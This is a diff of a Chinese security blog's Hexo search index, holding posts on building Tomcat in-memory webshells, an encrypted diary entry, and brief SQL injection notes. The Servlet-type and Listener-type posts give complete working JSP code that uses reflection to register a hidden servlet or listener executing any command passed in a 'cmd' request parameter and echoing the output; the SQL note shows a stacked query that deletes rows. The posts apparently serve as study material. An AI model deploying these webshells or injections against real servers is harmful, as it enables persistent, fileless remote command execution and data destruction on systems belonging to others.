+</code></pre>
+<h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><pre><code class="java">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.core.StandardWrapper&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.core.StandardWrapperFacade&quot; %&gt;
+&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
+&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;&lt;%--
+  Created by IntelliJ IDEA.
+  User: leihehe
+  Date: 30/12/2021
+  Time: 09:22
+  To change this template use File | Settings | File Templates.
+--%&gt;
+&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
+&lt;%!
+  public class EvilServlet extends javax.servlet.http.HttpServlet&#123;
+    @Override
+    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;
+      super.doPost(req, resp);
+    &#125;
+
+    @Override
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;
+      String cmd = req.getParameter(&quot;cmd&quot;);
+      InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
+      int i=0;
+      byte[] bytes=new byte[1024];
+      while ((i=inputStream.read(bytes))!=-1)&#123;
+        resp.getWriter().write(new String(bytes,0,i));
+        resp.getWriter().write(&quot;\r\n&quot;);
+      &#125;
+    &#125;
+  &#125;
+%&gt;
+
+&lt;%
+  StandardWrapperFacade stdWrapperFacade = (StandardWrapperFacade) config;
+  Field stdWrapperField = stdWrapperFacade.getClass().getDeclaredField(&quot;config&quot;);
+  stdWrapperField.setAccessible(true);
+  StandardWrapper stdWrapper = (StandardWrapper) stdWrapperField.get(stdWrapperFacade);
+  stdWrapper.setServlet(new EvilServlet());
+%&gt;
+</code></pre>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211230140132389.png" alt="image-20211230140132389"></p>
+]]></content>
+      <categories>
+        <category>Web Security</category>
+        <category>Java内存马</category>
+      </categories>
+      <tags>
+        <tag>Web Security</tag>
+        <tag>内存马</tag>
+        <tag>Tomcat</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Tomcat内存马系列(二):Listener型</title>
+    <url>/2021/12/29/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-%E4%BA%8C-Listener%E5%9E%8B/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Listener型内存马分析起来比Filter型的要简单很多，在监听到请求后自动触发。学习了<strong>JavaWeb</strong>后再来看这些其实都并不难。</p>
+<p>此文展示了我在不借助网上的Listener内存马资料下完成Listener内存马构造的过程。</p>
+<span id="more"></span>
+
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>首先创建一个servlet项目。引入Tomcat中的<strong>servlet-api.jar、tomcat-api.jar及catalina.jar</strong></p>
+<h1 id="内存马流程分析"><a href="#内存马流程分析" class="headerlink" title="内存马流程分析"></a>内存马流程分析</h1><h2 id="listener类型"><a href="#listener类型" class="headerlink" title="listener类型"></a>listener类型</h2><p>学过servlet的话应该知道，listener分为以下类型：</p>
+<ul>
+<li>ServletRequestListener - 对每次请求进行监听</li>
+<li>ServletContextListener -只会在服务器启动或者关闭时触发</li>
+<li>ServletSessionListener - 在创建、销毁session登情况触发。</li>
+</ul>
+<p>显而易见，我们选择使用ServletRequestListener类型的listener比较合适，因为其可以监听每次request的执行与销毁；</p>
+<h2 id="探究listener的注册与执行"><a href="#探究listener的注册与执行" class="headerlink" title="探究listener的注册与执行"></a>探究listener的注册与执行</h2><p>接下来，我们随意创建一个<code>TestListener</code></p>
+<pre><code class="java">import javax.servlet.ServletRequestEvent;
+import javax.servlet.ServletRequestListener;
+
+public class TestListener implements ServletRequestListener &#123;
+    @Override
+    public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;
+
+    &#125;
+    @Override
+    public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;
+        System.out.println(&quot;evil code&quot;);
+    &#125;
+&#125;
+</code></pre>
+<p>将他加入web.xml</p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229151841950.png" alt="image-20211229151841950"></p>
+<p>现在来探究一个正常的Listener被执行的流程</p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229152257919.png" alt="image-20211229152257919"></p>
+<p>在Class被创建的地方下个断点，再在代码执行的地方下个断点。</p>
+<p>发现了关键的地方 <code>listenerStart()</code></p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229152439542.png" alt="image-20211229152439542"></p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229152524318.png" alt="image-20211229152524318"></p>
+<p>继续跟进<code>findApplicationListeners()</code></p>
+<pre><code class="java">public String[] findApplicationListeners() &#123;
+    return this.applicationListeners;
+&#125;
+</code></pre>
+<p>由此可见，如果我们修改了<code>StandardContext</code>的<code>applicationListeners</code>属性，就可以让我们自己构造的恶意Listener加载进去。</p>
+<p>那么怎么能够获取到<code>StandardContext</code>呢？</p>
+<p>这里可能要一些前置知识：<strong>每一个项目都有一个ServletContext, ServletContext是全局共享的，也就是说所有的Servlet都可以访问这一个ServletContext，而ServletContext中往往保存上下文内可以访问的其他servlet的属性</strong></p>
+<p>那么<code>StandardContext</code>可能就在<code>ServletContext</code>中，而我们可以通过request来获取到ServletContext。</p>
+<p>我们在自己创建的<strong>HomeServlet</strong>中获取ServletContext并下个断点，重新运行看看</p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229153455331.png" alt="image-20211229153455331"></p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229153607771.png" alt="image-20211229153607771"></p>
+<p>获取后发现，servletContext中有一个applicationContext，其中包含了StandardContext，我们可以通过这里获取。</p>
+<h1 id="手动注册内存马"><a href="#手动注册内存马" class="headerlink" title="手动注册内存马"></a>手动注册内存马</h1><p>那么我们可以用反射的方式来获取到StandardContext</p>
+<p>Tomcat在处理jsp页面的时候，实际上创建一个servlet，并把jsp中的代码翻译生成到该servlet中，因此我们下面的演示直接在自己创建的<code>HomeServlet.java</code>中执行</p>
+<pre><code class="java">ServletContext servletContext = request.getServletContext();
+Field stdFiled=servletContext.getClass().getDeclaredField(&quot;context&quot;);
+stdFiled.setAccessible(true);
+ApplicationContext aplContext = (ApplicationContext) stdFiled.get(servletContext);
+Field standardFld = aplContext.getClass().getDeclaredField(&quot;context&quot;);
+standardFld.setAccessible(true);
+StandardContext standardContext = (StandardContext) standardFld.get(aplContext);
+</code></pre>
+<p>接下来我们依然要用反射的方式获取到其<code>applicationListeners</code>属性，并将我们的恶意Listener放在最前面</p>
+<pre><code class="java">List&lt;Object&gt; applicationEventListeners = Arrays.asList(standardContext.getApplicationEventListeners());
+applicationEventListeners.add(0,new TestListener());
+</code></pre>
+<p>到这里报错了</p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229154211578.png" alt="image-20211229154211578"></p>
+<p>看起来是add方法出了问题。</p>
+<blockquote>
+<p>Array内部的ArrayList没有重写AbstractList的add（xxx），导致我们上诉代码调用的add（xxx）其实是直接调用AbstractList类的add（xxx），所以直接抛出了异常UnsupportedOperationException。</p>
+</blockquote>
+<p>那么直接换成ArrayList即可</p>
+<pre><code class="java">List&lt;Object&gt; applicationEventListeners = Arrays.asList(standardContext.getApplicationEventListeners());
+List&lt;Object&gt; arrayList = new ArrayList(applicationEventListeners);
+arrayList.add(0,new TestListener());
+</code></pre>
+<p>最后将新建的arrayList重新赋值给<code>applicationEventListeners</code>，恰好有个这样的方法</p>
+<pre><code class="java">standardContext.setApplicationEventListeners(arrayList.toArray());
+</code></pre>
+<p><strong>整个注册内存马的过程：</strong></p>
+<pre><code class="java">ServletContext servletContext = request.getServletContext();
+Field stdFiled=servletContext.getClass().getDeclaredField(&quot;context&quot;);
+stdFiled.setAccessible(true);
+ApplicationContext aplContext = (ApplicationContext) stdFiled.get(servletContext);
+Field standardFld = aplContext.getClass().getDeclaredField(&quot;context&quot;);
+standardFld.setAccessible(true);
+StandardContext standardContext = (StandardContext) standardFld.get(aplContext);
+
+List&lt;Object&gt; applicationEventListeners = Arrays.asList(standardContext.getApplicationEventListeners());
+List&lt;Object&gt; arrayList = new ArrayList(applicationEventListeners);
+arrayList.add(0,new TestListener());
+standardContext.setApplicationEventListeners(arrayList.toArray());
+</code></pre>
+<h1 id="构造恶意内存马"><a href="#构造恶意内存马" class="headerlink" title="构造恶意内存马"></a>构造恶意内存马</h1><p>构造内存马，直接把上面的注册过程写到jsp页面，然后在jsp页面写一个<code>&lt;%! 方法%&gt;</code>就可以了。</p>
+<p>需要注意的是，重写的<code>ServletRequestListener</code>的类方法<code>public void requestInitialized(ServletRequestEvent servletRequestEvent)</code>中，只有参数<code>servletRequestEvent</code>，而没有response。 如果我们想使用内存马，最好是能够有回显。</p>
+<p>在<strong>Request</strong>类中，我们可以得到response，而Request类是<strong>RequestFacade</strong>类中的属性<img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229165853415.png" alt="image-20211229165853415"></p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229165807812.png" alt="image-20211229165807812"></p>
+<p>只要能够得到RequestFacade中的request属性，就能得到response object，所以我们直接用反射的方法来完成。</p>
+<p><strong>完整构造</strong>：</p>
+<pre><code class="java">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
+&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;
+&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
+&lt;%@ page import=&quot;java.util.List&quot; %&gt;
+&lt;%@ page import=&quot;java.util.Arrays&quot; %&gt;
+&lt;%@ page import=&quot;java.util.ArrayList&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.connector.RequestFacade&quot; %&gt;
+&lt;%--
+  Created by IntelliJ IDEA.
+  User: leihehe
+  Date: 29/12/2021
+  Time: 15:52
+  To change this template use File | Settings | File Templates.
+--%&gt;
+&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
+&lt;%!
+
+    class EvilListener implements ServletRequestListener&#123;
+
+        @Override
+        public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;
+
+        &#125;
+
+        @Override
+        public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;
+            try &#123;
+                ServletRequest servletRequest = servletRequestEvent.getServletRequest();
+                String cmd = servletRequest.getParameter(&quot;cmd&quot;);
+                RequestFacade requestFacade = (RequestFacade) servletRequest;
+                Field requestField = requestFacade.getClass().getDeclaredField(&quot;request&quot;);
+                requestField.setAccessible(true);
+                Request request = (Request)requestField.get(requestFacade);
+                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
+                int i = 0;
+                byte[] bytes = new byte[1024];
+                while ((i=inputStream.read(bytes)) != -1)&#123;
+                    request.getResponse().getWriter().write(new String(bytes,0,i));
+                    request.getResponse().getWriter().write(&quot;\r\n&quot;);
+                &#125;
+            &#125; catch (IOException | NoSuchFieldException | IllegalAccessException e) &#123;
+                e.printStackTrace();
+            &#125;
+        &#125;
+    &#125;
+
+%&gt;
+
+&lt;%
+    ServletContext servletContext = request.getServletContext();
+    Field stdFiled=servletContext.getClass().getDeclaredField(&quot;context&quot;);
+    stdFiled.setAccessible(true);
+    ApplicationContext aplContext = (ApplicationContext) stdFiled.get(servletContext);
+    Field standardFld = aplContext.getClass().getDeclaredField(&quot;context&quot;);
+    standardFld.setAccessible(true);
+    StandardContext standardContext = (StandardContext) standardFld.get(aplContext);
+
+    List&lt;Object&gt; applicationEventListeners = Arrays.asList(standardContext.getApplicationEventListeners());
+    List&lt;Object&gt; arrayList = new ArrayList(applicationEventListeners);
+    arrayList.add(0,new EvilListener());
+    standardContext.setApplicationEventListeners(arrayList.toArray());
+%&gt;
+</code></pre>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://blog.csdn.net/qq_31772441/article/details/80095037">调用list.add方法报错（java.lang.UnsupportedOperationException）</a></p>
 ]]></content>
       <categories>
         <category>Web Security</category>
@@ -12043,6 +12043,55 @@ if (isset($_POST[&#39;submit&#39;])) &#123;
       </tags>
   </entry>
   <entry>
+    <title>今天怎么样 - 记录我的学习与生活</title>
+    <url>/2022/01/25/%E4%BB%8A%E5%A4%A9%E6%80%8E%E4%B9%88%E6%A0%B7-%E8%AE%B0%E5%BD%95%E6%88%91%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E7%94%9F%E6%B4%BB/</url>
+    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="cf6d10e3d8218bff214db2fe36b3dc3e87e214999656f3b8e532280d461e3c62">866b8dd8da3390e86230366caa1004f73133dadcf86269f3a034cb8f0c775a6ace23dfe8cffbe2d19ab553c815ed16cb917dbccf04c6a0d8fcf711e570c7abb7e68aabd30a6c8e7fbc426ebb1c0432302e97234bafd16f6707063ba171c9c3ef7e4920e5fbfd9a9169dcddf21c4f0c5652ed47c1da0d62d90e2671eaa031c9faf6ce4a868604be38d46141c14f6d2e951e6879c69a6ef9df260673c522af9e864a31c651d539c3bd145847a077c17771b9775f67bb49c39af797a04bdf225a8703d9e7b71b3b55fc4ffa742bf71a7b830fbf7e0b6761f2801e265efc212586fcfeb75cb4854e4b4d1cfba80bfa5e3b7a05fb7ff632a7b666d96a09b41557303a84c6ca37fc550acc759341e39409cf21fabb28aede2d0f3a9019ff4d736b10f8a862e6020e07f6d7d87e4e4d29e2d57d48deecf819159fce02610613f50688ef3fde0df8460f8a1350ada34f791dff47734e2a35ca03e182150055aa54f60744f2f94e22e5e5a5189aec304a9db93aa542a1584b56e0e0f94e4090679d4870df59912b723e7bf6ab194827e04683e877842e9313e0109a63ae59cbc056ec0917d68a859a3e77f067f2e2a1844364a82d6444503eb4a139c2b9a16f1eef17eaad0d43d0f4296c6357779e3176d8b05e1df04755b7d1c3ea8dbcd7187334d24ccd3126103b67535011415b6190e2da9497420206eb511ede812147b34a92ef1e10046e8b8764785172d98c1217e6840cd508b81eb436d1124503197772462918e4bd9141fe33e9d1ae7924eea95dad3f72aaf322909ff1095632cd6c0d0f057e0b2c546e34f1e8571a7d5b4b96c367c94209de68adaf5948ca8ba61e7af8711e6bb75fcd523aa77a8179d833a8bae411606db8792603df5bdd6144f6abc62110c0c0541818eac1203110472449738066af4e8b83db91272571b9bbf8f52a9532469c021af99c5749f4a462f68a5fbb07cbefa0cddfff83f384e20680a3b7b6ee9951af3da7bbd6b8ed669f3b594d4ec77b2d14dde736749da4dd44a9e89e4d03aeb58bad2e34e940ea70b23a0348cd66d2da8241b07a722685804272453d97a46209652fdb3a1635433bc57edb4c89f1467b8e4dd2b08c29115da460f2af026f7a0a1d7bd1e865f9f00d303f72022af55f0f772469daf8af6acef4cf46eb060b95e5ca712e8a60e04b1baefcc38124c6033b3025454c392b52b4f421f43a3a269f07f2a067b860df56f1450c16cfad4ecc64d3df376424305a1f7665606672b3f4bfb20e96b5b754949de79b9156355bc4f514e03e6f55b53d7c5a32a295df220108e04c4e8b03d1935b2b79c606c91c14f01eb11463cbba9ccd5af19ee7b5a2c313b9c874052b4e2dac16e84462f15c49539bd172c2a6967f93c2735a2561fc0b0bd6e61efcd4188c4b35b228b237701258f2fbdfa102e3c07ae9d77dd114c10eee320ebf6bc9c3de9fb7869c74088ce5e66e3708e3b5990958664fd0d8a1cdd762d4c374d034a175af2cdb77f8e3b011660fc6aca74feaf9ffee6e8a04285cbf6ebd1b4b009f642998afe59d9411c9aeb37a68580b450bc4ee8692e6ceae0083232c3144f7a2e1a336532406c1486ffe1d0426a3d14f63d1c4ed28c6e2fcb594c3e59bdcc6677446bf17d033e6effa7bfcc754664d9d958744c13c1a471e8d53290e9863943511919ffe4a70814bfc9a83ae0bba7ce5e911d5218ba068fefe0fc85ff77e297b8262dca32f4e38c6bb2cc0ef4fd0f7d0991924e182560b26270e71c8cc753da822762fb7c0f71679ed00b45cab5d71becf7dbf08d0b58e5c651f20ed134362d2d0a1e4a22edb65c8a7fe139abd52ea2cc15666c94ef1f253387a4aeb7d9397d2c396d15a7bc453c83cdd1ab3b8372c1ae0605d65206c5b9a9f231fc464896458195b260cb079df03b334f6556d272b7f45392d3a0ad9ef14192967779ad6ed710dd78a9954f193661103966af4b7080db72075969052cd84fedf4a6feec7bce755477ba42a9ae5c278d4ac67a6d66a0ab8a890a78013f875ff00444f21e31b6521174cd930fd4b9dcdb6193621dbbae5735b2dab256e526b25339e5c57ba7407008d178770d5fce72edc2893ccd4b857a3029042214e724b965eb1800f07ad114d6984dc52e334346ad74bf2e551435de6f9d3660ace7235b15115e3d2838ae0982261210cec0eccb95f19b1e6c03cf699325ad8f8d73f211bb306a64f1c420f2549fc32f472ceb656065a38c2524470a4a28c3e0d46e26bbacc285799bc6736eb8d7d82767396061daccd7636da72fc352c17977268994489be3d28bbab52e82af94ddc6e1f11cdf649cca72ba213c1dc23be22105589016b58c512e1c694a36574db6dd898c66c9c533349d6829380a6c479ec7a73c58719003077b56bff2bb2746398bca4a6914bf6db9215205744914e92c61e5bd19166bb5b048264a5fe8fc0c1fff15bd81a8a86914e4ab923a591d02806c05f8171247d0592c457f423be7c5a1459da01e7a9c073669602acfcc1f87bbab8f8c4745596b56afd97ccdbdaee66337d0223b6499a024e2f729d032e8113076bcece35bb35982cad67a894afbec9b9d2905fe928b6c39f2e8a4a994d5b37bb095fc7ec94650581b47b503dacffafd1090b421e134fc928aa1eed59df8dcc3345464d0cb6eb632ef7671be494f0f5b042cc8c50e38663c55013f9b501575fa918c7af4b7fbf7bbb37171d279a2742ce7278a232abe46d111622516614a27176e588a145d17c1eaff72b20779e7d9fe13bc9fd55b9d82128d4377a0aadb2378961f39980f9f755ed0662aeeb30585eb0d5c6ec83b7f1d2bd1e63113cba40e62012ef3629fbb0b53ebf2d7060cef8ce6655d009a6a98599271f5c89739a9a99cbf9df2db899ae38f20f2ac1af7164a5360cf559a8bdc24c6ddec2eea970718a107e59e1e39c9bb323c09ce686cef7542a42d445ca0587d84e11b48104e3593c300da3c1a5f0d30f95735d7ecfa1b980027b8f7ed57a5b1f861f0cf9d69971c1c6486f5ac7762c94bc3cfa556c8c195a084b7ab5a0c8d71194a557b85401dc589377d4844a452dd5dfbfb0f257306c5f7b37ad3b12a7f78cef24f760e45ebe80b360422e4c4aac9b4e1807695f7ca385e5efbb8cf2038ccc602d8ec391c10b9217114b36aa95b39d0122ae0601581603a4d8fd653dc3f67951c7420b8e3d2d8e027a66c927e86672ad3e7670feb091aa22043c49e282fc4e79a33a9134a23569fec3e68ca4fd2f8eb67867ed76819c05fedeaf00a12b99ab607c14d5a008ab43a7237de0ab0e87b4df1d788f52d0687e3744b24fe5d125442ea251734ee595f7935175d2e7856ddbdfb0bcf74045d55e018b249dc6fa321c9505b831e27fd82632da51508fbd8064e75402a85e98c66a910ac7042bf47839401b16c83708bb83cf581880289d5fd0d2414b0f3b10607da3c30020a0b714c48de17f4a1413b264e0fc6df8c66378631fe78a133258f0472e604ac7398bf8ddd8f75d26b5552e926793fbcf8d788595c43906d2b196f4fdee1f8d2d5fae0896cf8325e95b8bb5371fab1fed7fafb28f697b3e73e7b7f477d07ea0c9245a1987b133391b0c15c36c05c774ff107755bf91d78fe6343e0b725e123cea772f2d3d18aa39a4761f4e212c9d71ac448dc30bd75aa470ec28ac6e601b027b39aadbd5d2fb6f2dcb938d540992a9c2a184cf74a3d301153d8f35bf7c5fb1e950b344b1632daaaadcfec31c18ebb428e870ab616fe73523c7b4667d8fbe58ea3f8803a610792ecc066c1b119a8906217a9d566481aa38962e2cc11a3b66987c95770db049651f188a8971fd4e0024cfc649f75356fc184b024e404cabdcdc81d845c00f00689c6080dfb4097554d29fa7d4139e802df374b1fdd8830a64d800f8ee53d98f1c4c89a94598d8b33f134b2812d23f5e1d41d7b8bc7010727a2f6f793934c20c99b26125385a06b105854ad646be1843daf6305f8063aa5dadd11f1f36750b91bc528a6243a90d5e58537c56f43bf26611feb4e4ae46e078afbd9c92146086fef2e182f5e2f93922ec3e5047037b3167f1cb4a1091a9de144f8fcfdfbda1f1635da60d3ebf9b1724b29a6adf048105de9e87c80b69a63b879707e89e5edad79f5a1a8d4af98bd49e9c7421c115d430c86d6ae73632ac8ed779d9b494326e09441bed9b5f2153247994b721f0fbbc83fc87fe9a25baba224b568cae35d68714f917eba2b5c518b33044d412d3e966226993b16e6591431be489124f3a50b6d27c26eb8dfa22564adb231faad47fd71ff71ac16278df47a49b9f3e09a94511059dc2bd6d2ed2fd1c7fac2ef579282b38451b0b83b41f16053fb9f09b7c96b67003217a13272f1c8b9d4533d3ff530c29aaf2d797f348e018abc1860f374b41dad3c909daa2c41e1447c0fd1be7c01619cc6cd6fcf4580791cc191aec09f89ca974bafb64745c871d001cb55aeb24618ffa58374ee30d73f87373545e7c7ccd1b1f0971d15cd8390b4c46a38ad9050436111d2bf9894d81e598d5e002c0afbc66121941e28d8e7ae1ad576d61a7eb873a1972d00c453d91c5530f9bf77433672bb6e53b43da3cc6926e455ff34a7274d8501071c797d6820417ec31174a7cb249d0bbc51423b1c227192743d75c32a2a63408142563d8f43848dab7f88a0867f661d764bace343a6db3308e02ceea9d083ea04b9b2d324df8ac88d88f58b6904fc29ebddb0d997d0a1585a948810551bdce2d26143f46bf16c55f62c9161be4bd2d22642cd28028f96dc8a4d73b3facfa31aaca33f12bacc0b8339928d73cd4a7a31a9e078ddc48fa304ecb4e0e1f6fce02a299cd8748fa9d930fe829b362d52ba74ab6129db558e7b9995592f7ade609f8baed2c0a014509783d2a088c61618e64e991d3ec1561e9e57906c72f2f45b13a4ea382f02a730f5ec1fbf94264a497d268786c5ad2c6e909986b2bb858444cf386c2665a0f2829875aba4f97753b959bae04877e478201b4745f9cf315e277b73cbbfe839415f1d0b9bedf93cafc54922b4678564f78fdea2ba99aa1baec5baa872909221386fdf99d7d89ae08ef0c267717c74e7e2853c53375afdb8d65d041b5e7c3c060ee02ba00c13505b183fea50d9e41d301b1e486396de015fb8a214da75a27dc3fe427a8f5ebcdd1d2c75d283f91bfdc77590cdfb889de2599d1b98c6d8bf7b211ae8f5d46d5976949f6e7a15c907b0a4af7e376fe8975c08aa1c1fc5e6007b41d8b1d1d250d4ac858fa43ab56e35fb560dac33f8ef889fc3da8153f67e67eb9d968754814c80088540a5f39f9694d0acea4ceb6830e8d2ed4fe</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+      <categories>
+        <category>others</category>
+      </categories>
+      <tags>
+        <tag>Diary</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>关于搜索型、字符型注入以及参数加密</title>
+    <url>/2021/06/11/%E5%85%B3%E4%BA%8E%E6%90%9C%E7%B4%A2%E5%9E%8B%E3%80%81%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8A%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86/</url>
+    <content><![CDATA[<h1 id="搜索型、字符型注入"><a href="#搜索型、字符型注入" class="headerlink" title="搜索型、字符型注入"></a>搜索型、字符型注入</h1><span id="more"></span>
+
+<p>一般搜索栏都会进行模糊搜索</p>
+<p>$search=GET[‘x’]</p>
+<p>可能会用到Select * from table where name like ‘%$search%’</p>
+<p>所以搜索型字符一般都有引号，需要考虑引号闭合</p>
+<p>字符型注入一样也会有引号，有些数字型也会有引号</p>
+<h1 id="参数加密"><a href="#参数加密" class="headerlink" title="参数加密"></a>参数加密</h1><p>一些注入点会用md5、base64等方式进行加密，所以我们也需要加密后再进行注入</p>
+<h1 id="SQL删除更新查询"><a href="#SQL删除更新查询" class="headerlink" title="SQL删除更新查询"></a>SQL删除更新查询</h1><p>注入时根据语句来构造语句</p>
+<p>查询：<code>select * from zhibo_test.m_sms where id=1;</code></p>
+<p>插入:<code>insert into zhibo_test.m_sms values(&#39;66&#39;,&#39;register&#39;,&#39;13345677654&#39;,&#39;1234&#39;,&#39;0&#39;,&#39;11.11.1.1&#39;,&#39;15345333321&#39;);</code></p>
+<p>更新:<code>update zhibo_test.m_sms set username=&#39;xiaodi&#39; where id=27;</code></p>
+<p>删除: <code>delete from m_sms where id=28;</code></p>
+<p>多条叠加（堆叠测试）:<code>select * from m_sms; delete from m_sms where id=66;</code></p>
+]]></content>
+      <categories>
+        <category>Web Security</category>
+        <category>Sql注入</category>
+      </categories>
+      <tags>
+        <tag>Web Security</tag>
+        <tag>SQL Injection</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>汇编个人学习笔记</title>
     <url>/2021/09/06/%E6%B1%87%E7%BC%96%E4%B8%AA%E4%BA%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>汇编是很多课程的重要基础，正好最近在学习操作系统，发现在操作系统的学习中，汇编也表现得极为重要，同样在逆向的学习中，不会汇编基本等于与逆向无门了。</p>
@@ -12343,55 +12392,6 @@ int 21H
       <tags>
         <tag>逆向</tag>
         <tag>汇编基础</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>今天怎么样 - 记录我的学习与生活</title>
-    <url>/2022/01/25/%E4%BB%8A%E5%A4%A9%E6%80%8E%E4%B9%88%E6%A0%B7-%E8%AE%B0%E5%BD%95%E6%88%91%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E7%94%9F%E6%B4%BB/</url>
-    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="cf6d10e3d8218bff214db2fe36b3dc3e87e214999656f3b8e532280d461e3c62">866b8dd8da3390e86230366caa1004f73133dadcf86269f3a034cb8f0c775a6ace23dfe8cffbe2d19ab553c815ed16cb917dbccf04c6a0d8fcf711e570c7abb7e68aabd30a6c8e7fbc426ebb1c0432302e97234bafd16f6707063ba171c9c3ef7e4920e5fbfd9a9169dcddf21c4f0c5652ed47c1da0d62d90e2671eaa031c9faf6ce4a868604be38d46141c14f6d2e951e6879c69a6ef9df260673c522af9e864a31c651d539c3bd145847a077c17771b9775f67bb49c39af797a04bdf225a8703d9e7b71b3b55fc4ffa742bf71a7b830fbf7e0b6761f2801e265efc212586fcfeb75cb4854e4b4d1cfba80bfa5e3b7a05fb7ff632a7b666d96a09b41557303a84c6ca37fc550acc759341e39409cf21fabb28aede2d0f3a9019ff4d736b10f8a862e6020e07f6d7d87e4e4d29e2d57d48deecf819159fce02610613f50688ef3fde0df8460f8a1350ada34f791dff47734e2a35ca03e182150055aa54f60744f2f94e22e5e5a5189aec304a9db93aa542a1584b56e0e0f94e4090679d4870df59912b723e7bf6ab194827e04683e877842e9313e0109a63ae59cbc056ec0917d68a859a3e77f067f2e2a1844364a82d6444503eb4a139c2b9a16f1eef17eaad0d43d0f4296c6357779e3176d8b05e1df04755b7d1c3ea8dbcd7187334d24ccd3126103b67535011415b6190e2da9497420206eb511ede812147b34a92ef1e10046e8b8764785172d98c1217e6840cd508b81eb436d1124503197772462918e4bd9141fe33e9d1ae7924eea95dad3f72aaf322909ff1095632cd6c0d0f057e0b2c546e34f1e8571a7d5b4b96c367c94209de68adaf5948ca8ba61e7af8711e6bb75fcd523aa77a8179d833a8bae411606db8792603df5bdd6144f6abc62110c0c0541818eac1203110472449738066af4e8b83db91272571b9bbf8f52a9532469c021af99c5749f4a462f68a5fbb07cbefa0cddfff83f384e20680a3b7b6ee9951af3da7bbd6b8ed669f3b594d4ec77b2d14dde736749da4dd44a9e89e4d03aeb58bad2e34e940ea70b23a0348cd66d2da8241b07a722685804272453d97a46209652fdb3a1635433bc57edb4c89f1467b8e4dd2b08c29115da460f2af026f7a0a1d7bd1e865f9f00d303f72022af55f0f772469daf8af6acef4cf46eb060b95e5ca712e8a60e04b1baefcc38124c6033b3025454c392b52b4f421f43a3a269f07f2a067b860df56f1450c16cfad4ecc64d3df376424305a1f7665606672b3f4bfb20e96b5b754949de79b9156355bc4f514e03e6f55b53d7c5a32a295df220108e04c4e8b03d1935b2b79c606c91c14f01eb11463cbba9ccd5af19ee7b5a2c313b9c874052b4e2dac16e84462f15c49539bd172c2a6967f93c2735a2561fc0b0bd6e61efcd4188c4b35b228b237701258f2fbdfa102e3c07ae9d77dd114c10eee320ebf6bc9c3de9fb7869c74088ce5e66e3708e3b5990958664fd0d8a1cdd762d4